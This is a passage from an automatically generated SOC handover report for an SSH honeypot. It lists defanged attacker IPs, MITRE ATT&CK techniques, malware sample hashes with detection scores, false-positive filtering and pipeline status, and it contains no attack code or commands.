| `196.92.7[.]247` | **6** | 2026-05-23 08:24 | 2026-05-23 09:03 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `154.144.225[.]226` | **3** | 2026-05-23 08:29 | 2026-05-23 08:52 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `113.141.72[.]65` | **2** | 2026-05-23 07:51 | 2026-05-23 09:17 | 4m | 0 | `T1592` | 🟢 LOW |
| `190.220.172[.]154` | **2** | 2026-05-23 08:00 | 2026-05-23 08:04 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `85.192.31[.]14` | **2** | 2026-05-23 06:50 | 2026-05-23 06:54 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.154[.]252` | 1 | 2026-05-23 07:59 | 2026-05-23 08:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `105.27.148[.]94` | 1 | 2026-05-23 07:33 | 2026-05-23 07:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.72.114[.]183` | 1 | 2026-05-23 09:04 | 2026-05-23 09:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.209.186[.]110` | 1 | 2026-05-23 09:26 | 2026-05-23 09:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `129.146.181[.]168` | 1 | 2026-05-23 06:59 | 2026-05-23 06:59 | 37s | 0 | `T1592` | 🟢 LOW |
| `14.103.104[.]36` | 1 | 2026-05-23 08:28 | 2026-05-23 08:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.169[.]153` | 1 | 2026-05-23 07:32 | 2026-05-23 07:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.211.125[.]105` | 1 | 2026-05-23 08:35 | 2026-05-23 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.93.3[.]33` | 1 | 2026-05-23 07:18 | 2026-05-23 07:18 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.30.14[.]165` | 1 | 2026-05-23 07:19 | 2026-05-23 07:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.50.235[.]157` | 1 | 2026-05-23 08:48 | 2026-05-23 08:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.206.182[.]209` | 1 | 2026-05-23 09:02 | 2026-05-23 09:02 | 10s | 0 | `T1592` | 🟢 LOW |
| `196.92.7[.]246` | 1 | 2026-05-23 09:00 | 2026-05-23 09:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.92.7[.]249` | 1 | 2026-05-23 08:33 | 2026-05-23 08:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.32.104[.]99` | 1 | 2026-05-23 08:12 | 2026-05-23 08:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]44` | 1 | 2026-05-23 07:32 | 2026-05-23 07:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `82.152.132[.]24` | 1 | 2026-05-23 08:22 | 2026-05-23 08:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **31/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.141.72[.]65` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 1 |
| `129.146.181[.]168` | US | Oracle Corporation | **100** ⚠️ | 7 |
| `193.30.14[.]165` | EC | AUSTROLINK Nodo TAMBO | **100** ⚠️ | 5 |
| `186.68.83[.]105` | EC | Satnet Gye Coorp CM | **100** ⚠️ | 46 |
| `118.194.234[.]8` | SG | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 27 |
| `194.50.235[.]157` | GB | Infrawatch Limited | **100** ⚠️ | 6 |
| `120.209.186[.]110` | CN | China Mobile Communications Corporation | **100** ⚠️ | 17 |
| `101.126.154[.]252` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 9 |
| `196.92.7[.]246` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `66.132.172[.]44` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 117 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 52 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 48 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 28 |

---

## 🔕 False Positive Summary (18 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 14 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 151 cases |
| Tool 34  | Credential Extractor        | ✅ 100 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 18 filtered (11.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 52 priority case(s) shown individually · 26 recon entry/entries in table (9 group(s) consolidating 64 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-23T09:58:14Z_
